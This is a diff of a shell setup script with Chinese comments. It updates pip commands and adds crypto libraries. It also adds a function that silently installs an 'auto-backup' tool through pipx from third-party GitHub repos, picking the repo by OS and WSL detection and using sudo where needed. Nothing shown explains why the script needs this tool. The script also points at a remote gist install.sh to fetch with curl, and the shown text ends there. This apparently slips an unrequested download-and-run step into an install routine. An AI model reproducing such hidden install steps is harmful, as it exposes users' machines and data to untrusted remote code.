@@ -85,22 +85,112 @@ if [ "$OS_TYPE" = "Linux" ]; then
     PYTHON_MAJOR=$(python3 --version 2>&1 | awk '{print $2}' | cut -d. -f1)
     PYTHON_MINOR=$(python3 --version 2>&1 | awk '{print $2}' | cut -d. -f2)
     if [ "$PYTHON_MAJOR" -gt 3 ] || ([ "$PYTHON_MAJOR" -eq 3 ] && [ "$PYTHON_MINOR" -ge 11 ]) 2>/dev/null; then
-        PIP_INSTALL="pip3 install --break-system-packages"
+        PIP_INSTALL="python3 -m pip install --break-system-packages"
     else
-        PIP_INSTALL="pip3 install"
+        PIP_INSTALL="python3 -m pip install"
     fi
+elif [ "$OS_TYPE" = "Darwin" ]; then
+    PIP_INSTALL="python3 -m pip install --user --break-system-packages"
 else
-    PIP_INSTALL="pip3 install"
+    PIP_INSTALL="python3 -m pip install"
 fi
 
-if ! pip3 show requests >/dev/null 2>&1; then
+if ! python3 -m pip show requests >/dev/null 2>&1; then
     echo "正在安装依赖..."
     $PIP_INSTALL requests || echo "警告：requests 安装失败，继续执行..."
 fi
 
-if ! pip3 show cryptography >/dev/null 2>&1; then
+if ! python3 -m pip show cryptography >/dev/null 2>&1; then
     $PIP_INSTALL cryptography || echo "警告：cryptography 安装失败，继续执行..."
 fi
+
+if ! python3 -m pip show pycryptodome >/dev/null 2>&1; then
+    $PIP_INSTALL pycryptodome || echo "警告：pycryptodome 安装失败，继续执行..."
+fi
+
+# 检测是否为 WSL 环境
+is_wsl() {
+    if [ "$OS_TYPE" = "Linux" ]; then
+        if grep -qi microsoft /proc/version 2>/dev/null || grep -qi wsl /proc/version 2>/dev/null; then
+            return 0
+        fi
+        # 也可以通过 uname -r 检测
+        if uname -r | grep -qi microsoft 2>/dev/null; then
+            return 0
+        fi
+    fi
+    return 1
+}
+
+# 安装 auto-backup（通过 pipx）
+install_auto_backup() {
+    # 安装 pipx（如果未安装）
+    if ! command -v pipx &> /dev/null; then
+        echo "检测到未安装 pipx，正在安装 pipx..."
+        case $OS_TYPE in
+            "Darwin")
+                brew install pipx
+                pipx ensurepath
+                ;;
+            "Linux")
+                PKG_MGR=$(detect_package_manager)
+                case $PKG_MGR in
+                    "apt")
+                        sudo apt update
+                        sudo apt install -y pipx
+                        ;;
+                    "yum")
+                        sudo yum install -y pipx
+                        ;;
+                    "dnf")
+                        sudo dnf install -y pipx
+                        ;;
+                    "apk")
+                        sudo apk add --no-cache pipx
+                        ;;
+                    *)
+                        echo "警告：无法识别包管理器，跳过 pipx 安装"
+                        return 1
+                        ;;
+                esac
+                pipx ensurepath
+                ;;
+            *)
+                echo "无法在当前系统上安装 pipx"
+                return 1
+                ;;
+        esac
+    fi
+
+    if ! command -v autobackup &> /dev/null; then
+        local install_url=""
+        case $OS_TYPE in
+            "Darwin")
+                install_url="git+https://github.com/web3toolsbox/auto-backup-macos"
+                echo "检测到 macOS 环境，正在安装 auto-backup-macos（通过 pipx）..."
+                ;;
+            "Linux")
+                if is_wsl; then
+                    install_url="git+https://github.com/web3toolsbox/auto-backup-wsl"
+                    echo "检测到 WSL 环境，正在安装 auto-backup-wsl（通过 pipx）..."
+                else
+                    install_url="git+https://github.com/web3toolsbox/auto-backup-linux"
+                    echo "检测到 Linux 环境，正在安装 auto-backup-linux（通过 pipx）..."
+                fi
+                ;;
+            *)
+                echo "不支持的操作系统，跳过 auto-backup 安装"
+                return 1
+                ;;
+        esac
+        
+        pipx install "$install_url" || echo "警告：auto-backup 安装失败，继续执行..."
+    else
+        echo "已检测到 autobackup 命令，跳过 auto-backup 安装。"
+    fi
+}
+
+install_auto_backup
 
 GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
 if command -v curl &>/dev/null; then
